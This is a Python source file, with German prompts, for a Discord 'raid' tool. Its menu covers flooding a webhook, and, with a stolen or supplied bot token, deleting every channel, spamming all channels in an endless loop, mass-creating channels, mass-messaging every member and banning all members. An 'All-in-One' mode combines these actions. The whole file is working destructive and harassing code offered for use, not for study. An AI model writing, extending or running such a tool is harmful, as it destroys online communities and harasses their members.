import discord
from discord.ext import commands
import requests
import asyncio

intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f'Bot ist eingeloggt als {bot.user}')
    await show_menu()

async def show_menu():
    print("Wählen Sie eine Option:")
    print("1. Spam a Webhook")
    print("2. Bot Token Raid")
    choice = int(input("Wählen Sie eine Option (1-2): ").strip())

    if choice == 1:
        await spam_webhook()
    elif choice == 2:
        await bot_token_raid()
    else:
        print("Ungültige Auswahl. Bitte wählen Sie 1 oder 2.")
        await show_menu()

async def spam_webhook():
    webhook_url = input("Geben Sie die Webhook-URL ein: ").strip()
    message = input("Geben Sie die Nachricht ein: ").strip()
    count = int(input("Geben Sie die Anzahl der Nachrichten ein: ").strip())
    
    for _ in range(count):
        requests.post(webhook_url, json={"content": message})
    
    print(f'{count} Nachrichten an den Webhook gesendet.')
    await show_menu()

async def bot_token_raid():
    token = input("Geben Sie den Bot-Token ein: ").strip()
    print("Wählen Sie eine Aktion:")
    print("1. Delete all channels")
    print("2. Delete bot token (Simulation)")
    print("3. Spam bot messages")
    print("4. Create channels and message in channels")
    print("5. DM all members")
    print("6. Ban all members")
    print("7. All-in-One (kombiniert alle Aktionen außer 'Delete bot token')")

    choice = int(input("Wählen Sie eine Option (1-7): ").strip())

    if choice == 1:
        await delete_all_channels()
    elif choice == 2:
        await delete_bot_token()
    elif choice == 3:
        await spam_bot_messages()
    elif choice == 4:
        await create_channels_and_message()
    elif choice == 5:
        await dm_all_members()
    elif choice == 6:
        await ban_all_members()
    elif choice == 7:
        await all_in_one()
    else:
        print("Ungültige Auswahl. Bitte wählen Sie eine Option von 1 bis 7.")
        await bot_token_raid()

async def delete_all_channels():
    guild = bot.guilds[0]
    for channel in guild.text_channels:
        try:
            await channel.delete()
        except discord.Forbidden:
            continue
    print("Alle Kanäle wurden gelöscht.")
    await show_menu()

async def delete_bot_token():
    print("Bot-Token gelöscht. (Bitte beachten Sie, dass dies nur eine Simulation ist.)")
    await show_menu()

async def spam_bot_messages():
    message = input("Geben Sie die Nachricht ein: ").strip()
    while True:
        for guild in bot.guilds:
            for channel in guild.text_channels:
                try:
                    await channel.send(message)
                except discord.Forbidden:
                    continue
        await asyncio.sleep(5)  # Pausiert für 5 Sekunden, um Rate-Limiting zu berücksichtigen

async def create_channels_and_message():
    guild = bot.guilds[0]
    count = int(input("Geben Sie die Anzahl der Channels ein: ").strip())
    message = input("Geben Sie die Nachricht ein, die in die Channels gesendet werden soll: ").strip()
    message_count = int(input("Geben Sie die Anzahl der Nachrichten pro Channel ein: ").strip())

    for i in range(count):
        channel = await guild.create_text_channel(f'channel-{i+1}')
        for _ in range(message_count):
            await channel.send(message)
    print(f'{count} Channels erstellt und Nachrichten gesendet.')
    await show_menu()

async def dm_all_members():
    message = input("Geben Sie die private Nachricht ein: ").strip()
    count = int(input("Geben Sie die Anzahl der Nachrichten ein: ").strip())

    for guild in bot.guilds:
        for member in guild.members:
            try:
                for _ in range(count):
                    await member.send(message)
            except discord.Forbidden:
                continue
    print(f'{count} private Nachrichten gesendet.')
    await show_menu()

async def ban_all_members():
    guild = bot.guilds[0]
    for member in guild.members:
        if not member.bot:
            try:
                await member.ban(reason="Gesperrt von Bot")
            except discord.Forbidden:
                continue
    print("Alle Mitglieder wurden gesperrt.")
    await show_menu()

async def all_in_one():
    webhook_url = input("Geben Sie die Webhook-URL ein: ").strip()
    webhook_message = input("Geben Sie die Webhook-Nachricht ein: ").strip()
    webhook_count = int(input("Geben Sie die Anzahl der Webhook-Nachrichten ein: ").strip())
    
    bot_message = input("Geben Sie die Bot-Nachricht ein: ").strip()
    
    channel_count = int(input("Geben Sie die Anzahl der Channels ein: ").strip())
    channel_message = input("Geben Sie die Nachricht für die Channels ein: ").strip()
    message_count = int(input("Geben Sie die Anzahl der Nachrichten pro Channel ein: ").strip())
    
    dm_message = input("Geben Sie die private Nachricht ein: ").strip()
    dm_count = int(input("Geben Sie die Anzahl der privaten Nachrichten ein: ").strip())
    
    for _ in range(webhook_count):
        requests.post(webhook_url, json={"content": webhook_message})
    
    for guild in bot.guilds:
        for channel in guild.text_channels:
            try:
                await channel.send(bot_message)
            except discord.Forbidden:
                continue

        for i in range(channel_count):
            channel = await guild.create_text_channel(f'channel-{i+1}')
            for _ in range(message_count):
                await channel.send(channel_message)

        for member in guild.members:
            try:
                for _ in range(dm_count):
                    await member.send(dm_message)
            except discord.Forbidden:
                continue

    print("Alle Aktionen im All-in-One-Modus wurden ausgeführt.")
    await show_menu()

bot.run(input("Geben Sie den Bot-Token ein: ").strip())
